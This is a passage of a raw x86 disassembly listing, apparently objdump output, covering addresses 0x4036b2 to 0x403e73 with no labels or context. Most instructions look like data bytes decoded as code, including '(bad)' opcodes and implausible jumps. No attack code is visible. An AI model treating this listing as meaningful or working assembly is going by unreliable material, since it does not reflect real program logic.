  4036b2:	xor    BYTE PTR [ecx],ah
  4036b4:	or     al,0x11
  4036b7:	add    BYTE PTR [esi+0x0],cl
  4036ba:	push   eax
  4036bb:	sbb    al,BYTE PTR [ecx]
  4036bd:	test   DWORD PTR [eax],esi
  4036bf:	add    BYTE PTR [eax],al
  4036c1:	dec    edx
  4036c2:	mov    al,0x62
  4036c4:	pop    es
  4036c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036c6:	add    DWORD PTR [eax-0x77f7ccfa],esi
  4036cc:	and    BYTE PTR [esp+edx*1],0x95
  4036d0:	add    BYTE PTR [eax],bl
  4036d2:	add    BYTE PTR [ecx],bl
  4036d4:	add    BYTE PTR [esi],dl
  4036d6:	add    BYTE PTR [eax],al
  4036d8:	repz or BYTE PTR [eax+0x8],al
  4036dc:	popf   
  4036dd:	add    BYTE PTR [ecx+ebp*1],0x8
  4036e1:	adc    BYTE PTR [ecx+0x70],al
  4036e4:	sub    BYTE PTR [ecx],ah
  4036e6:	rol    al,0x51
  4036e9:	mov    al,ds:0xc10280
  4036ee:	imul   esp,DWORD PTR ds:0xe0001022,0x501a208
  4036f8:	xor    BYTE PTR [edx-0xa],0x58
  4036fc:	add    al,0x18
  4036fe:	inc    esp
  4036ff:	xor    BYTE PTR [eax],cl
  403701:	add    BYTE PTR [eax],al
  403703:	inc    eax
  403704:	add    BYTE PTR [eax+0x48464816],bl
  40370a:	push   edx
  40370b:	adc    BYTE PTR [ecx+0x1a8820a4],0x80
  403712:	add    ah,BYTE PTR [eax]
  403714:	inc    edi
  403715:	sbb    BYTE PTR [edx],ah
  403717:	add    al,BYTE PTR [eax+0x2144a406]
  40371d:	or     eax,0x40448322
  403722:	add    BYTE PTR [eax+0x40],0x22
  403726:	mov    DWORD PTR [edx],edi
  403728:	call   DWORD PTR ds:0x44a2f4
  40372e:	loopne 0x4036b2
  403730:	and    BYTE PTR [ebx+0x30280894],0x10
  403737:	or     DWORD PTR [edx+0x48],edx
  40373a:	pop    es
  40373b:	ret    0x4050
  40373e:	xor    cl,al
  403740:	add    eax,0x510043a0
  403745:	adc    DWORD PTR [edx],edx
  403747:	test   BYTE PTR [edx+0x24200600],dl
  40374d:	test   al,0x74
  40374f:	add    BYTE PTR [ecx],ah
  403751:	sub    DWORD PTR [ecx-0x31edf6aa],eax
  403757:	add    BYTE PTR [ecx],dh
  403759:	add    BYTE PTR [eax-0x4d],dh
  40375c:	inc    ebx
  40375d:	sbb    BYTE PTR [ebx],al
  40375f:	add    bl,BYTE PTR [esi+0x49402265]
  403765:	test   al,dl
  403767:	or     ecx,DWORD PTR [eax+0x61]
  40376a:	and    BYTE PTR [ecx],ch
  40376c:	or     dl,BYTE PTR [eax]
  40376e:	inc    eax
  40376f:	or     DWORD PTR [ecx],eax
  403771:	or     eax,DWORD PTR [eax-0xfedfffc]
  403777:	add    BYTE PTR [ecx+eax*1+0x0],al
  40377b:	inc    edx
  40377c:	adc    al,BYTE PTR [edi]
  40377e:	loop   0x403721
  403780:	or     BYTE PTR [esi+0x734c8360],cl
  403786:	and    DWORD PTR [edx+0x24018256],0x408a0446
  403790:	add    BYTE PTR [edx],bl
  403792:	adc    BYTE PTR [eax+0x10],al
  403795:	nop
  403796:	add    al,0x24
  403798:	or     DWORD PTR [eax],eax
  40379a:	sbb    BYTE PTR [eax+0x1c5d8230],0xd2
  4037a1:	add    BYTE PTR [ecx],0xa3
  4037a4:	inc    esp
  4037a5:	enter  0x4025,0x3a
  4037a9:	xchg   BYTE PTR [edx+0x11],al
  4037ac:	inc    eax
  4037ad:	add    al,BYTE PTR [edx]
  4037af:	or     BYTE PTR es:[ecx],al
  4037b2:	inc    ecx
  4037b3:	or     BYTE PTR [ecx],bh
  4037b5:	add    BYTE PTR [eax],ah
  4037b7:	adc    BYTE PTR [edx],al
  4037b9:	inc    esp
  4037ba:	ins    BYTE PTR es:[edi],dx
  4037bb:	add    eax,0x100
  4037c0:	push   esp
  4037c1:	and    DWORD PTR [esi],edx
  4037c3:	inc    edx
  4037c4:	pop    esi
  4037c5:	add    dl,0x2
  4037c8:	cmp    eax,DWORD PTR [ecx]
  4037ca:	sub    eax,0x66484808
  4037cf:	mov    eax,0x8800025
  4037d4:	and    BYTE PTR [ecx+0x5],0x90
  4037d8:	mov    BYTE PTR [eax],cl
  4037da:	bound  eax,QWORD PTR [eax-0x78]
  4037dd:	and    BYTE PTR [eax],dl
  4037df:	jb     0x403849
  4037e1:	inc    eax
  4037e2:	push   eax
  4037e3:	sbb    BYTE PTR [eax+0x70],al
  4037e6:	inc    eax
  4037e7:	inc    ecx
  4037e8:	or     BYTE PTR [eax-0x7c],cl
  4037eb:	add    ebx,esi
  4037ed:	mov    al,ds:0x90206028
  4037f2:	add    al,0x18
  4037f4:	mov    ds:0x84061100,eax
  4037f9:	push   0x61
  4037fb:	add    al,0x0
  4037fd:	or     DWORD PTR [edx+0x21020e],ecx
  403803:	add    DWORD PTR [esi],0x82562f01
  403809:	or     al,0x34
  40380b:	xor    BYTE PTR [eax],al
  40380d:	add    DWORD PTR [ecx],edx
  40380f:	push   0x42302870
  403814:	pop    esp
  403815:	adc    ecx,DWORD PTR [edx]
  403817:	or     al,BYTE PTR [ebx]
  403819:	adc    cl,BYTE PTR [eax+0x1]
  40381c:	push   es
  40381d:	mov    ah,BYTE PTR [ecx]
  40381f:	adc    BYTE PTR [eax-0x7f3cf7ff],cl
  403825:	and    BYTE PTR [esi],0xe8
  403828:	add    DWORD PTR [eax],ecx
  40382a:	push   es
  40382b:	(bad)  
  40382c:	adc    bh,BYTE PTR [eax+0x76]
  40382f:	cwde   
  403830:	mov    WORD PTR [eax-0x63],gs
  403833:	add    BYTE PTR [eax+0x4104394],al
  403839:	adc    BYTE PTR [eax],al
  40383b:	or     BYTE PTR [eax+eax*4],al
  40383e:	add    dh,BYTE PTR [ecx-0x3ffe5dee]
  403844:	add    edx,DWORD PTR [eax-0x5e]
  403847:	mov    al,BYTE PTR [eax+0x5c]
  40384a:	js     0x40380d
  40384c:	or     ah,cl
  40384e:	mov    al,ds:0xe2003180
  403853:	test   BYTE PTR [eax],al
  403855:	aam    0x2
  403857:	mov    ecx,0x900f82a1
  40385c:	inc    ebp
  40385d:	and    BYTE PTR [edx],0x0
  403860:	test   al,0x48
  403862:	xchg   edx,eax
  403863:	pop    eax
  403864:	inc    eax
  403865:	inc    eax
  403866:	add    BYTE PTR [edx],cl
  403868:	add    eax,edx
  40386a:	mov    DWORD PTR [eax],esp
  40386c:	bound  eax,QWORD PTR [esp+eax*2]
  40386f:	inc    eax
  403870:	xchg   BYTE PTR [eax+0x41],dh
  403873:	add    BYTE PTR [eax],al
  403875:	popa   
  403876:	and    al,BYTE PTR [esi-0x2f]
  403879:	inc    eax
  40387a:	dec    eax
  40387b:	add    DWORD PTR [edx],0x1bf108c0
  403881:	js     0x4038c3
  403883:	nop
  403884:	xor    dl,BYTE PTR [ecx]
  403886:	fmul   QWORD PTR [eax-0x30]
  403889:	popf   
  40388a:	test   BYTE PTR [ecx-0x6eccf400],ah
  403890:	xchg   BYTE PTR [eax+0xa],cl
  403893:	dec    esp
  403894:	adc    BYTE PTR [eax+0x8],bl
  403897:	dec    ecx
  403898:	add    BYTE PTR [edx],0xa8
  40389b:	add    ah,BYTE PTR [eax]
  40389d:	mov    eax,DWORD PTR [eax-0x7fde0000]
  4038a3:	inc    eax
  4038a4:	add    BYTE PTR [edx+ebx*1+0x201be0e],al
  4038ab:	adc    al,0x26
  4038ae:	add    BYTE PTR [esi+0x11],0x80
  4038b2:	xor    al,0x18
  4038b4:	les    eax,FWORD PTR [esi-0x70]
  4038b7:	add    al,0x20
  4038b9:	add    DWORD PTR [edx],eax
  4038bb:	push   ss
  4038bc:	and    BYTE PTR [edx+0x34],dh
  4038bf:	or     BYTE PTR [eax],0x7c
  4038c2:	push   es
  4038c3:	add    al,0x1
  4038c5:	and    BYTE PTR [ecx+0x13404500],dl
  4038cb:	pusha  
  4038cc:	arpl   WORD PTR [eax],sp
  4038ce:	add    cl,BYTE PTR [eax]
  4038d0:	push   es
  4038d1:	adc    al,0x0
  4038d3:	pusha  
  4038d4:	add    al,BYTE PTR [eax]
  4038d6:	add    BYTE PTR [eax+eax*2],cl
  4038d9:	and    BYTE PTR [ecx],al
  4038db:	inc    eax
  4038dc:	loop   0x403921
  4038de:	rcr    BYTE PTR [eax+0x50],0x62
  4038e2:	push   es
  4038e3:	or     ah,BYTE PTR [ecx+0x27]
  4038e6:	xor    dl,BYTE PTR [edx-0x7fffef9f]
  4038ec:	add    BYTE PTR [eax],dl
  4038ee:	mov    al,0x1
  4038f0:	inc    ecx
  4038f1:	adc    BYTE PTR [eax-0x65dbdb7f],ah
  4038f7:	add    al,0x55
  4038f9:	adc    BYTE PTR [ecx],al
  4038fb:	sbb    BYTE PTR [eax],al
  4038fd:	or     BYTE PTR [eax],cl
  4038ff:	add    al,0x81
  403901:	inc    edx
  403902:	sbb    al,0x4
  403904:	cmp    DWORD PTR [ecx+0x424c183],0x3001e318
  40390e:	sbb    BYTE PTR [eax-0x7ff7f7fd],al
  403914:	or     bl,BYTE PTR [esi+0x2104140]
  40391a:	inc    esp
  40391b:	popa   
  40391c:	add    BYTE PTR [ebx-0x7e],0xa2
  403920:	and    BYTE PTR [ecx],al
  403922:	pop    ss
  403923:	add    BYTE PTR [ecx],ah
  403925:	adc    BYTE PTR [eax],ah
  403927:	add    BYTE PTR [edx],dl
  403929:	mov    eax,ds:0x24294060
  40392e:	aas    
  40392f:	or     al,0x0
  403931:	dec    eax
  403932:	mov    al,ds:0x316c142
  403937:	or     DWORD PTR [edx+ecx*1+0x2a90300],eax
  40393e:	or     dl,al
  403940:	test   DWORD PTR [eax],eax
  403942:	push   ecx
  403943:	sub    BYTE PTR [eax],ah
  403945:	push   es
  403946:	add    cl,BYTE PTR [ecx-0x20]
  403949:	add    BYTE PTR [ecx-0x13fdee60],al
  40394f:	or     al,BYTE PTR [eax]
  403951:	mov    ds:0xa4019321,al
  403956:	xchg   BYTE PTR [edx+0x109240],al
  40395c:	add    dl,al
  40395e:	sub    al,0x30
  403960:	sub    BYTE PTR [esi-0x6fae9fe0],al
  403966:	sub    BYTE PTR [esi],dl
  403968:	and    cl,BYTE PTR [ecx]
  40396a:	add    BYTE PTR [esp+eax*1],cl
  40396d:	and    BYTE PTR [eax+0xe040024],al
  403973:	inc    ebx
  403974:	xchg   DWORD PTR [eax],eax
  403976:	adc    dh,dl
  403978:	mov    ds:0x33202864,al
  40397d:	test   BYTE PTR [eax],dl
  40397f:	fdivr  QWORD PTR [edx+0x2]
  403982:	and    dh,BYTE PTR [eax]
  403984:	push   esp
  403985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403986:	add    DWORD PTR [eax],esi
  403988:	or     DWORD PTR ds:0x28009802,0x2580d293
  403992:	add    al,0x90
  403994:	sbb    eax,DWORD PTR ds:0x8b00204e
  40399a:	mov    BYTE PTR [esp+ecx*1-0x60],dl
  40399e:	adc    DWORD PTR [edx+0x1],eax
  4039a1:	mov    DWORD PTR [edx],eax
  4039a3:	es js  0x403926
  4039a6:	adc    BYTE PTR [edi],cl
  4039a8:	inc    esp
  4039a9:	pusha  
  4039aa:	add    BYTE PTR [eax],cl
  4039ac:	xor    BYTE PTR [eax],al
  4039ae:	cmp    BYTE PTR [eax+edx*1-0x5fcaf7fb],cl
  4039b5:	inc    esp
  4039b6:	lock add al,0x94
  4039b9:	mov    BYTE PTR ds:0x854008d2,al
  4039bf:	inc    eax
  4039c0:	push   ds
  4039c1:	add    al,BYTE PTR [esi+0x14]
  4039c4:	add    BYTE PTR [edx],al
  4039c6:	inc    edx
  4039c7:	or     BYTE PTR [eax+0x18208010],ah
  4039cd:	add    DWORD PTR [eax],eax
  4039cf:	add    BYTE PTR [edx+0x1],0x72
  4039d3:	dec    esp
  4039d4:	add    ah,0x51
  4039d7:	add    al,0x39
  4039d9:	adc    DWORD PTR [esi],0x410a5408
  4039df:	adc    BYTE PTR [eax+0x51],al
  4039e2:	inc    edx
  4039e3:	adc    BYTE PTR [eax*2+0xb47123],cl
  4039ea:	add    BYTE PTR [edx+0x2a],dl
  4039ed:	add    al,BYTE PTR [esp+eiz*4+0x8284]
  4039f4:	add    BYTE PTR [ebx+0x38],ah
  4039f7:	sbb    BYTE PTR [ecx+0x0],al
  4039fa:	add    BYTE PTR [edx-0x72],al
  4039fd:	adc    BYTE PTR [eax],dl
  4039ff:	ret    
  403a00:	test   al,0x90
  403a02:	mov    DWORD PTR [eax],esp
  403a04:	sub    BYTE PTR [ecx+edx*4-0x62],bh
  403a08:	or     DWORD PTR [eax],ecx
  403a0a:	popa   
  403a0b:	pusha  
  403a0c:	add    BYTE PTR [eax+0x107ea218],al
  403a12:	lock or BYTE PTR [eax-0x60],cl
  403a16:	sbb    BYTE PTR [ecx],cl
  403a18:	add    eax,0x1019135
  403a1d:	or     al,0x10
  403a1f:	add    dl,BYTE PTR [eax+0x18]
  403a22:	test   DWORD PTR [edx],edx
  403a24:	inc    edx
  403a25:	mov    ch,0x5
  403a27:	nop
  403a28:	xchg   edx,eax
  403a29:	add    BYTE PTR [eax],dl
  403a2b:	add    eax,0x800481aa
  403a30:	xor    ah,BYTE PTR [ecx+0x60]
  403a33:	inc    eax
  403a34:	add    DWORD PTR [eax],eax
  403a36:	add    ah,BYTE PTR [eax]
  403a38:	xchg   ecx,eax
  403a39:	add    BYTE PTR [eax],bl
  403a3b:	gs nop
  403a3d:	add    BYTE PTR [eax],al
  403a3f:	test   eax,0x836d001
  403a44:	add    dl,dh
  403a46:	dec    eax
  403a47:	sbb    BYTE PTR [ecx],dh
  403a49:	sbb    BYTE PTR [eax+0x4063900],dh
  403a4f:	inc    eax
  403a50:	inc    edx
  403a51:	cwde   
  403a52:	or     eax,0x80010114
  403a57:	and    BYTE PTR [edx],dh
  403a59:	or     BYTE PTR [ecx],cl
  403a5b:	add    BYTE PTR [eax],al
  403a5d:	or     al,0xc2
  403a5f:	mov    ds:0x35340b06,al
  403a64:	jo     0x403a28
  403a66:	dec    edx
  403a67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a68:	ror    ah,1
  403a6a:	sbb    al,0x17
  403a6c:	sub    BYTE PTR [eax],al
  403a6e:	add    ebp,DWORD PTR [edx+0x38ab202]
  403a74:	add    dl,cl
  403a76:	xor    DWORD PTR [eax+0x1],0x41
  403a7a:	inc    edx
  403a7b:	add    BYTE PTR [eax],dh
  403a7d:	inc    ecx
  403a7e:	add    eax,0x981ad480
  403a83:	popa   
  403a84:	add    al,0x29
  403a86:	xor    al,BYTE PTR [eax]
  403a88:	sub    BYTE PTR [eax],al
  403a8a:	or     BYTE PTR ds:0x2262c,al
  403a90:	add    BYTE PTR [eax-0xbd9afdf],bl
  403a96:	or     al,0x80
  403a98:	push   ebp
  403a99:	adc    BYTE PTR [edx+0x9802c40],cl
  403a9f:	nop
  403aa0:	and    BYTE PTR [eax],ah
  403aa2:	mov    eax,0x44a00697
  403aa7:	add    BYTE PTR [ecx],al
  403aa9:	and    BYTE PTR [ecx],al
  403aab:	add    BYTE PTR [edi+0x11304264],al
  403ab1:	xchg   BYTE PTR [ecx],bl
  403ab3:	add    BYTE PTR [eax-0x74571d9f],0x4
  403aba:	imul   esp,DWORD PTR [eax+eax*1+0x10],0x24
  403abf:	adc    BYTE PTR [eax+0x0],al
  403ac2:	add    ah,BYTE PTR es:[edx+0x1]
  403ac6:	add    BYTE PTR [edx+eax*4],ah
  403ac9:	or     al,0x80
  403acb:	add    BYTE PTR [esi+eiz*1-0x7e],0x83
  403ad0:	add    DWORD PTR [eax+0x6008200],eax
  403ad6:	dec    esi
  403ad7:	sbb    DWORD PTR [ecx+edx*8],eax
  403ada:	add    DWORD PTR [eax],edx
  403adc:	dec    ecx
  403add:	sbb    BYTE PTR [eax+eax*1+0x1a],dl
  403ae1:	cmp    al,0x87
  403ae3:	jp     0x403ae5
  403ae5:	inc    esp
  403ae6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ae7:	add    DWORD PTR [edx],edi
  403ae9:	inc    edi
  403aea:	xchg   BYTE PTR [eax],ch
  403aec:	adc    BYTE PTR [edx],al
  403aee:	and    BYTE PTR [esi],0x46
  403af1:	add    BYTE PTR [eax],ch
  403af3:	inc    edx
  403af4:	inc    edx
  403af5:	or     BYTE PTR [eax+0x68082041],ah
  403afb:	or     BYTE PTR [eax+0x4],al
  403afe:	popa   
  403aff:	mov    al,0x2
  403b01:	shr    BYTE PTR [eax+eax*1],cl
  403b04:	popa   
  403b05:	mov    al,ds:0x33570b61
  403b0a:	add    eax,0x432c00
  403b0f:	mov    eax,ds:0xd000102
  403b14:	inc    edx
  403b15:	add    DWORD PTR [ecx],eax
  403b17:	sbb    BYTE PTR [edx],al
  403b19:	adc    BYTE PTR [edx],al
  403b1b:	push   es
  403b1c:	or     al,0x44
  403b1e:	sub    DWORD PTR [ecx],eax
  403b20:	rol    BYTE PTR [eax],0x30
  403b23:	mov    BYTE PTR [esi],dl
  403b25:	or     eax,0x28018818
  403b2a:	add    BYTE PTR [eax],ah
  403b2c:	lock in al,dx
  403b2e:	add    BYTE PTR [edx+esi*4+0x2c],al
  403b32:	shl    BYTE PTR [edx],0x20
  403b35:	test   BYTE PTR [eax+0x40],ah
  403b38:	es daa 
  403b3a:	or     BYTE PTR [esi+eax*1],ah
  403b3d:	inc    edx
  403b3e:	xor    BYTE PTR [eax-0x1ffcd000],0xd6
  403b45:	nop
  403b46:	imul   eax,DWORD PTR [edx+0x11],0x8124339
  403b4d:	add    edx,eax
  403b4f:	sbb    al,BYTE PTR [eax-0x16]
  403b52:	add    BYTE PTR [edx+0x4105e03],al
  403b58:	or     BYTE PTR [ebp+0x2],ah
  403b5b:	test   eax,0x10e41430
  403b60:	jmp    0x8965e6a7
  403b65:	adc    al,0x81
  403b67:	add    eax,DWORD PTR [eax+0x18]
  403b6a:	sub    BYTE PTR [eax+0x12814e1a],ah
  403b70:	add    BYTE PTR [eax],ah
  403b72:	fs jb  0x403b17
  403b75:	and    DWORD PTR [ecx],eax
  403b77:	push   0x35001016
  403b7c:	add    esp,DWORD PTR [eax+0xd]
  403b7f:	add    al,0x8
  403b81:	xchg   DWORD PTR [eax],edx
  403b83:	xor    al,BYTE PTR [ecx-0x20]
  403b86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b87:	xor    BYTE PTR [ebp-0x6b],dl
  403b8a:	or     eax,0x88484701
  403b8f:	sub    BYTE PTR [eax],al
  403b91:	adc    ch,BYTE PTR [eax+0x2844871]
  403b97:	inc    eax
  403b98:	jo     0x403bfa
  403b9a:	add    al,0x55
  403b9c:	add    ch,BYTE PTR [eax+0x0]
  403b9f:	adc    BYTE PTR [eax],al
  403ba1:	add    BYTE PTR [edx+edx*1],dl
  403ba4:	dec    ebp
  403ba5:	or     BYTE PTR [edx+ebp*4+0x46104028],dl
  403bac:	mov    al,0x0
  403bae:	repnz es push es
  403bb1:	and    al,0x97
  403bb3:	push   eax
  403bb4:	add    al,0x7a
  403bb6:	add    DWORD PTR [eax],eax
  403bb8:	or     BYTE PTR [eax],cl
  403bba:	or     BYTE PTR [eax],al
  403bbc:	es inc eax
  403bbe:	inc    edx
  403bbf:	add    BYTE PTR [esi],al
  403bc1:	arpl   WORD PTR [eax],ax
  403bc3:	or     eax,0x41160780
  403bc8:	dec    esp
  403bc9:	adc    DWORD PTR [ebx],ecx
  403bcb:	mov    BYTE PTR [eax-0x6ebbb5f0],ah
  403bd1:	inc    esp
  403bd2:	mov    edx,0x20605004
  403bd7:	aam    0x8
  403bd9:	fs or  al,0x13
  403bdc:	and    DWORD PTR [esi],0x86294d99
  403be2:	push   es
  403be3:	add    DWORD PTR [ecx],eax
  403be5:	xor    BYTE PTR [edx-0x6c],0x3
  403be9:	sub    esp,eax
  403beb:	xor    BYTE PTR ds:0x8c021040,bl
  403bf1:	xor    BYTE PTR [eax],dl
  403bf3:	adc    BYTE PTR [eax],al
  403bf5:	add    BYTE PTR [ecx],cl
  403bf7:	or     BYTE PTR [eax],al
  403bf9:	inc    esi
  403bfa:	xor    eax,0x409f222
  403bff:	mov    al,ds:0x3054115
  403c04:	or     BYTE PTR [eax],0x59
  403c07:	nop
  403c08:	add    cl,BYTE PTR [eax+0xa]
  403c0b:	inc    esp
  403c0c:	xor    al,0x2
  403c0e:	or     DWORD PTR [edx],eax
  403c10:	mov    al,ds:0x408a0918
  403c15:	add    al,BYTE PTR [edx]
  403c17:	mov    al,BYTE PTR [ecx]
  403c19:	adc    ebx,ecx
  403c1b:	data16 add dl,BYTE PTR [eax]
  403c1e:	or     DWORD PTR [edx],ebx
  403c20:	nop
  403c21:	fadd   DWORD PTR [edx+eiz*1-0x28d7ec00]
  403c28:	cmp    BYTE PTR [eax+0x22310038],dl
  403c2e:	lods   eax,DWORD PTR ds:[esi]
  403c2f:	add    BYTE PTR [ecx],al
  403c31:	and    BYTE PTR [eax+0x452126d1],0x46
  403c38:	add    dh,BYTE PTR [edi]
  403c3a:	dec    edx
  403c3b:	add    al,0x20
  403c3d:	adc    DWORD PTR [eax+0x10210030],eax
  403c43:	and    BYTE PTR [eax],dl
  403c45:	add    DWORD PTR [eax+0x0],ecx
  403c48:	sub    al,0x20
  403c4a:	and    BYTE PTR [eax],ah
  403c4c:	sbb    eax,0x20480800
  403c51:	mov    al,ds:0x10440b38
  403c56:	add    BYTE PTR [eax+0x12],ch
  403c59:	pop    eax
  403c5a:	add    DWORD PTR [eax+0x7a],0x10
  403c5e:	inc    edx
  403c5f:	aam    0x89
  403c61:	add    BYTE PTR [esi],ch
  403c63:	and    DWORD PTR ds:0x8821c060,edx
  403c69:	push   cs
  403c6a:	xor    DWORD PTR [eax+eax*4],eax
  403c6d:	ss inc eax
  403c6f:	or     DWORD PTR [ecx-0x40],eax
  403c72:	adc    eax,0x36088220
  403c77:	and    DWORD PTR ds:0x80483220,edi
  403c7d:	adc    DWORD PTR [eax+0x10],ecx
  403c80:	test   al,0x44
  403c82:	and    BYTE PTR [ebp-0x5bf7b374],al
  403c88:	and    ebx,DWORD PTR [eax-0x3f]
  403c8b:	push   es
  403c8c:	loop   0x403c0e
  403c8e:	nop
  403c8f:	adc    DWORD PTR [edx-0x777fef7b],esp
  403c95:	and    BYTE PTR [eax-0x7f7f2fd7],cl
  403c9b:	add    BYTE PTR [edx],ch
  403c9d:	sub    dh,BYTE PTR [edx-0x35]
  403ca0:	add    BYTE PTR [ecx+0x3410404],0x40
  403ca7:	add    BYTE PTR [esi],al
  403ca9:	push   es
  403caa:	adc    al,BYTE PTR es:[ecx]
  403cad:	add    al,BYTE PTR [ecx-0x7f]
  403cb0:	xchg   edi,eax
  403cb1:	push   es
  403cb2:	add    BYTE PTR [esi],al
  403cb4:	or     eax,0x1ac4001
  403cb9:	adc    BYTE PTR [edx+eax*2+0x5802c213],al
  403cc0:	add    BYTE PTR [ecx],dl
  403cc2:	and    BYTE PTR [eax+0x14],ch
  403cc5:	push   ss
  403cc6:	or     DWORD PTR [eax-0x2f],eax
  403cc9:	sub    BYTE PTR [ecx+0x681249ca],ch
  403ccf:	pusha  
  403cd0:	cmp    BYTE PTR [eax+0x11408030],ah
  403cd6:	mov    BYTE PTR [ecx],dl
  403cd8:	adc    al,0xc0
  403cda:	adc    BYTE PTR ds:0x40220400,0x71
  403ce1:	add    BYTE PTR [ebp+0x50],al
  403ce4:	inc    ecx
  403ce5:	add    eax,0x96800497
  403cea:	in     al,0xa0
  403cec:	add    eax,0x68611023
  403cf1:	and    eax,DWORD PTR [esi+0x2310c400]
  403cf7:	and    BYTE PTR [esi],ch
  403cf9:	mov    al,0x33
  403cfb:	fs push eax
  403cfd:	and    BYTE PTR [eax+0x60],al
  403d00:	add    al,0x83
  403d02:	pop    edx
  403d03:	add    BYTE PTR [edx+0x29],al
  403d06:	test   BYTE PTR [eax+0x40],ah
  403d09:	push   ss
  403d0a:	add    BYTE PTR [eax],al
  403d0c:	xchg   edx,eax
  403d0d:	inc    esp
  403d0e:	add    BYTE PTR [ebx-0x50],al
  403d11:	add    BYTE PTR [ebx],cl
  403d13:	bound  ebx,QWORD PTR [eax+0x1084445]
  403d19:	rcl    BYTE PTR [eax+0x244468],0x70
  403d20:	or     BYTE PTR [esi],al
  403d22:	add    BYTE PTR [esi+edx*1],al
  403d25:	adc    bh,BYTE PTR [edx]
  403d27:	sbb    eax,DWORD PTR [edx]
  403d29:	mov    BYTE PTR [eax],cl
  403d2b:	xor    al,ah
  403d2d:	lods   eax,DWORD PTR ds:[esi]
  403d2e:	and    DWORD PTR [edx],edx
  403d30:	test   al,0x0
  403d32:	test   al,0x86
  403d34:	xor    eax,0x41000033
  403d39:	call   0x38a8:0x1408518
  403d40:	add    BYTE PTR [eax-0x7e1edeff],cl
  403d46:	add    al,0x0
  403d49:	add    BYTE PTR [edx],dl
  403d4b:	outs   dx,BYTE PTR ds:[esi]
  403d4c:	add    BYTE PTR [eax],ah
  403d4e:	inc    eax
  403d4f:	add    cl,BYTE PTR [eax]
  403d51:	or     al,BYTE PTR [eax-0x38]
  403d54:	retf   
  403d55:	add    BYTE PTR [ecx],al
  403d57:	add    BYTE PTR [esi+0x52],al
  403d5a:	test   DWORD PTR [edx+0x30138000],ebx
  403d60:	dec    ebp
  403d61:	sbb    ecx,DWORD PTR [edx-0x43]
  403d64:	add    ah,al
  403d66:	test   al,0x89
  403d68:	add    eax,0x81142405
  403d6d:	pop    eax
  403d6e:	add    al,0x80
  403d70:	and    eax,DWORD PTR [ecx]
  403d72:	xchg   ebp,eax
  403d73:	add    BYTE PTR [eax+0x40],al
  403d76:	adc    BYTE PTR [ecx+0x40],dl
  403d79:	inc    ecx
  403d7a:	ret    0x964
  403d7d:	dec    eax
  403d7e:	adc    al,0xa0
  403d80:	add    DWORD PTR [edx-0x1fdf7fb0],ebp
  403d86:	inc    edx
  403d87:	mov    WORD PTR [ebx+0x50],?
  403d8a:	inc    edx
  403d8b:	inc    eax
  403d8c:	dec    ecx
  403d8d:	adc    al,BYTE PTR [ecx]
  403d8f:	inc    esp
  403d90:	dec    ecx
  403d91:	and    al,0x18
  403d93:	add    al,BYTE PTR [eax]
  403d95:	add    DWORD PTR [bp+si+0x31],esp
  403d99:	and    DWORD PTR [ecx+0x1],esp
  403d9c:	add    BYTE PTR [edx],al
  403d9e:	and    BYTE PTR [eax+0x50a89084],dl
  403da4:	add    edx,DWORD PTR [edx]
  403da6:	mov    ds:0x205603a,eax
  403dab:	add    BYTE PTR [edx],0x81
  403dae:	xor    cl,BYTE PTR [eax+0x304402d8]
  403db4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403db5:	add    al,0x0
  403db7:	mov    al,0x3c
  403db9:	or     eax,DWORD PTR [eax+0x0]
  403dbc:	lods   al,BYTE PTR ds:[esi]
  403dbd:	add    BYTE PTR ds:0x6902806,dl
  403dc3:	inc    eax
  403dc4:	add    BYTE PTR [ecx+0x0],dl
  403dc7:	jb     0x403dea
  403dc9:	and    BYTE PTR [eax],dh
  403dcb:	inc    eax
  403dcc:	or     BYTE PTR [eax],al
  403dce:	and    cl,al
  403dd0:	adc    cl,0x42
  403dd3:	add    al,BYTE PTR [eax]
  403dd5:	xor    BYTE PTR [eax+edx*2],0x43
  403dd9:	rol    DWORD PTR [edi],0x6c
  403ddc:	add    esp,0x49048094
  403de2:	adc    al,0x90
  403de4:	inc    esi
  403de5:	or     al,0x48
  403de7:	and    BYTE PTR [ecx],ah
  403de9:	and    BYTE PTR ds:0x238830c0,al
  403def:	xor    dh,BYTE PTR [edx+edx*1+0x0]
  403df3:	sbb    BYTE PTR [edx+0x11472402],cl
  403df9:	test   BYTE PTR [esi-0x7ffbeffc],al
  403dff:	pop    eax
  403e00:	add    BYTE PTR [eax+0x34204d0],ah
  403e06:	dec    edx
  403e07:	push   eax
  403e08:	add    BYTE PTR [ebx+eax*4],ah
  403e0b:	add    BYTE PTR [eax+0x0],al
  403e0e:	sbb    ah,BYTE PTR [eax-0x6f]
  403e11:	add    BYTE PTR [ebp+0x20e0221],al
  403e17:	sub    ecx,DWORD PTR [edx+0x12634842]
  403e1d:	inc    edx
  403e1e:	push   ss
  403e1f:	adc    DWORD PTR [eax+0x1222117a],ebx
  403e25:	dec    ecx
  403e26:	add    DWORD PTR [eax-0x60],eax
  403e29:	or     BYTE PTR [eax],ah
  403e2b:	lea    eax,[eax]
  403e2d:	push   eax
  403e2e:	daa    
  403e2f:	push   es
  403e30:	and    BYTE PTR [eax+0x45881848],ah
  403e36:	or     BYTE PTR [ecx-0x60],ah
  403e39:	and    DWORD PTR [esi+0x840848],edx
  403e3f:	and    ah,BYTE PTR [esi]
  403e41:	or     BYTE PTR [edx],ah
  403e43:	or     al,0x4
  403e45:	or     al,0x98
  403e47:	add    al,0x68
  403e49:	mov    DWORD PTR [eax-0x5ef3fdfb],esp
  403e4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e50:	add    al,0x50
  403e52:	mov    ss,WORD PTR [edx]
  403e54:	or     al,BYTE PTR [eax]
  403e56:	adc    DWORD PTR [eax+0x68145110],ecx
  403e5c:	and    BYTE PTR [ecx+eax*4],al
  403e5f:	xor    BYTE PTR [edx],ah
  403e61:	loopne 0x403de4
  403e63:	ret    0x2012
  403e66:	test   al,0x14
  403e68:	inc    eax
  403e69:	add    BYTE PTR [eax-0xe8ff9fa],al
  403e6f:	add    DWORD PTR [eax],eax
  403e71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e72:	inc    ebp
  403e73:	add    al,0x31
